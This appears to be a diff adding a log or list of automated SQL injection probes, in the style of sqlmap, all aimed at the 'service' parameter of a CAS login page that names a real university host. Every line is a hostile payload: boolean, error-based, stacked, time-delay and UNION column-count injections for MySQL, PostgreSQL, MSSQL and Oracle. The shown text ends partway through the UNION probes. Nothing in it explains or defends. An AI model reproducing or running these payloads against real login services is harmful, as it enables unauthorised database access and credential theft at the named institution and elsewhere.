@@ -1,0 +1,1559 @@
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php
+/cas/login?service=2698
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php'""."..,()
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php'NAWbej<'">UJuDOs
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) AND 2705=6158 AND (1103=1103
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) AND 2140=2140 AND (5587=5587
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php AND 6960=1734
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php AND 2140=2140
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') AND 1139=1933 AND ('CpFJ'='CpFJ
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') AND 2140=2140 AND ('nJZd'='nJZd
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' AND 2248=4818 AND 'jfvV'='jfvV
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' AND 2140=2140 AND 'gHhn'='gHhn
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' AND 5948=6511 AND '%'='
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' AND 2140=2140 AND '%'='
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php AND 5170=1118-- DiVA
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php AND 2140=2140-- iwXk
+/cas/login?service=(SELECT (CASE WHEN (5190=8773) THEN 5190 ELSE 5190*(SELECT 5190 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
+/cas/login?service=(SELECT (CASE WHEN (2316=2316) THEN 2316 ELSE 2316*(SELECT 2316 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) AND (SELECT 2781 FROM(SELECT COUNT(*),CONCAT(0x7171786b71,(SELECT (ELT(2781=2781,1))),0x7162716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (9934=9934
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php AND (SELECT 2781 FROM(SELECT COUNT(*),CONCAT(0x7171786b71,(SELECT (ELT(2781=2781,1))),0x7162716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') AND (SELECT 2781 FROM(SELECT COUNT(*),CONCAT(0x7171786b71,(SELECT (ELT(2781=2781,1))),0x7162716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('WEhc'='WEhc
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' AND (SELECT 2781 FROM(SELECT COUNT(*),CONCAT(0x7171786b71,(SELECT (ELT(2781=2781,1))),0x7162716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'GnBi'='GnBi
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' AND (SELECT 2781 FROM(SELECT COUNT(*),CONCAT(0x7171786b71,(SELECT (ELT(2781=2781,1))),0x7162716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php AND (SELECT 2781 FROM(SELECT COUNT(*),CONCAT(0x7171786b71,(SELECT (ELT(2781=2781,1))),0x7162716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- rjdw
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) AND 1267=CAST((CHR(113)||CHR(113)||CHR(120)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (1267=1267) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(113)||CHR(106)||CHR(113)) AS NUMERIC) AND (4909=4909
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php AND 1267=CAST((CHR(113)||CHR(113)||CHR(120)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (1267=1267) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(113)||CHR(106)||CHR(113)) AS NUMERIC)
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') AND 1267=CAST((CHR(113)||CHR(113)||CHR(120)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (1267=1267) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(113)||CHR(106)||CHR(113)) AS NUMERIC) AND ('zAJT'='zAJT
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' AND 1267=CAST((CHR(113)||CHR(113)||CHR(120)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (1267=1267) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(113)||CHR(106)||CHR(113)) AS NUMERIC) AND 'fHUt'='fHUt
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' AND 1267=CAST((CHR(113)||CHR(113)||CHR(120)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (1267=1267) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(113)||CHR(106)||CHR(113)) AS NUMERIC) AND '%'='
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php AND 1267=CAST((CHR(113)||CHR(113)||CHR(120)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (1267=1267) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(113)||CHR(106)||CHR(113)) AS NUMERIC)-- NiDb
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) AND 7671=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (7671=7671) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(113)+CHAR(106)+CHAR(113))) AND (5666=5666
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php AND 7671=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (7671=7671) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(113)+CHAR(106)+CHAR(113)))
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') AND 7671=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (7671=7671) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(113)+CHAR(106)+CHAR(113))) AND ('AjVA'='AjVA
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' AND 7671=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (7671=7671) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(113)+CHAR(106)+CHAR(113))) AND 'ZjUb'='ZjUb
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' AND 7671=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (7671=7671) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(113)+CHAR(106)+CHAR(113))) AND '%'='
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php AND 7671=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (7671=7671) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(113)+CHAR(106)+CHAR(113)))-- pTcm
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) AND 4051=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(120)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (4051=4051) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(113)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND (1290=1290
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php AND 4051=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(120)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (4051=4051) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(113)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') AND 4051=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(120)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (4051=4051) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(113)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND ('FXUF'='FXUF
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' AND 4051=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(120)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (4051=4051) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(113)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND 'tSla'='tSla
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' AND 4051=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(120)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (4051=4051) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(113)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND '%'='
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php AND 4051=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(120)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (4051=4051) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(113)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)-- VjTN
+/cas/login?service=(SELECT 4344 FROM(SELECT COUNT(*),CONCAT(0x7171786b71,(SELECT (ELT(4344=4344,1))),0x7162716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+/cas/login?service=(SELECT CONCAT(0x7171786b71,(SELECT (ELT(7196=7196,1))),0x7162716a71))
+/cas/login?service=(SELECT (CHR(113)||CHR(113)||CHR(120)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (8271=8271) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(113)||CHR(106)||CHR(113)))
+/cas/login?service=(SELECT CHAR(113)+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (1194=1194) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(113)+CHAR(106)+CHAR(113))
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php);(SELECT * FROM (SELECT(SLEEP(5)))QrPf)#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php;(SELECT * FROM (SELECT(SLEEP(5)))QrPf)#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php');(SELECT * FROM (SELECT(SLEEP(5)))QrPf)#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php';(SELECT * FROM (SELECT(SLEEP(5)))QrPf)#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%';(SELECT * FROM (SELECT(SLEEP(5)))QrPf)#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php);SELECT PG_SLEEP(5)--
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php;SELECT PG_SLEEP(5)--
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php');SELECT PG_SLEEP(5)--
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php';SELECT PG_SLEEP(5)--
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%';SELECT PG_SLEEP(5)--
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php);WAITFOR DELAY '0:0:5'--
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php;WAITFOR DELAY '0:0:5'--
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php');WAITFOR DELAY '0:0:5'--
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php';WAITFOR DELAY '0:0:5'--
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%';WAITFOR DELAY '0:0:5'--
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(122)||CHR(101)||CHR(85)||CHR(98),5) FROM DUAL--
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(122)||CHR(101)||CHR(85)||CHR(98),5) FROM DUAL--
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(122)||CHR(101)||CHR(85)||CHR(98),5) FROM DUAL--
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(122)||CHR(101)||CHR(85)||CHR(98),5) FROM DUAL--
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(122)||CHR(101)||CHR(85)||CHR(98),5) FROM DUAL--
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) AND (SELECT * FROM (SELECT(SLEEP(5)))ypbG) AND (8427=8427
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php AND (SELECT * FROM (SELECT(SLEEP(5)))ypbG)
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') AND (SELECT * FROM (SELECT(SLEEP(5)))ypbG) AND ('RxpL'='RxpL
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' AND (SELECT * FROM (SELECT(SLEEP(5)))ypbG) AND 'VMeC'='VMeC
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' AND (SELECT * FROM (SELECT(SLEEP(5)))ypbG) AND '%'='
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php AND (SELECT * FROM (SELECT(SLEEP(5)))ypbG)-- CFxn
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) AND 7108=(SELECT 7108 FROM PG_SLEEP(5)) AND (4662=4662
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php AND 7108=(SELECT 7108 FROM PG_SLEEP(5))
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') AND 7108=(SELECT 7108 FROM PG_SLEEP(5)) AND ('ZBKS'='ZBKS
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' AND 7108=(SELECT 7108 FROM PG_SLEEP(5)) AND 'FFCr'='FFCr
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' AND 7108=(SELECT 7108 FROM PG_SLEEP(5)) AND '%'='
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php AND 7108=(SELECT 7108 FROM PG_SLEEP(5))-- vfhn
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) WAITFOR DELAY '0:0:5' AND (2093=2093
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php WAITFOR DELAY '0:0:5'
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') WAITFOR DELAY '0:0:5' AND ('IJaM'='IJaM
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' WAITFOR DELAY '0:0:5' AND 'hzAS'='hzAS
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' WAITFOR DELAY '0:0:5' AND '%'='
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php WAITFOR DELAY '0:0:5'-- XASo
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) AND 4100=DBMS_PIPE.RECEIVE_MESSAGE(CHR(120)||CHR(84)||CHR(116)||CHR(85),5) AND (8567=8567
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php AND 4100=DBMS_PIPE.RECEIVE_MESSAGE(CHR(120)||CHR(84)||CHR(116)||CHR(85),5)
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') AND 4100=DBMS_PIPE.RECEIVE_MESSAGE(CHR(120)||CHR(84)||CHR(116)||CHR(85),5) AND ('PqCb'='PqCb
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' AND 4100=DBMS_PIPE.RECEIVE_MESSAGE(CHR(120)||CHR(84)||CHR(116)||CHR(85),5) AND 'EBAS'='EBAS
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' AND 4100=DBMS_PIPE.RECEIVE_MESSAGE(CHR(120)||CHR(84)||CHR(116)||CHR(85),5) AND '%'='
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php AND 4100=DBMS_PIPE.RECEIVE_MESSAGE(CHR(120)||CHR(84)||CHR(116)||CHR(85),5)-- hKZv
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) ORDER BY 1-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) UNION ALL SELECT NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) UNION ALL SELECT NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) UNION ALL SELECT NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) UNION ALL SELECT NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php ORDER BY 1-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') ORDER BY 1-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') UNION ALL SELECT NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') UNION ALL SELECT NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') UNION ALL SELECT NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') UNION ALL SELECT NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' ORDER BY 1-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' UNION ALL SELECT NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' UNION ALL SELECT NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' UNION ALL SELECT NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' UNION ALL SELECT NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' ORDER BY 1-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' UNION ALL SELECT NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' UNION ALL SELECT NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' UNION ALL SELECT NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' UNION ALL SELECT NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php ORDER BY 1-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) ORDER BY 1#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) UNION ALL SELECT NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) UNION ALL SELECT NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) UNION ALL SELECT NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) UNION ALL SELECT NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php ORDER BY 1#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') ORDER BY 1#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') UNION ALL SELECT NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') UNION ALL SELECT NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') UNION ALL SELECT NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') UNION ALL SELECT NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' ORDER BY 1#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' UNION ALL SELECT NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' UNION ALL SELECT NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' UNION ALL SELECT NULL,NULL,NULL#
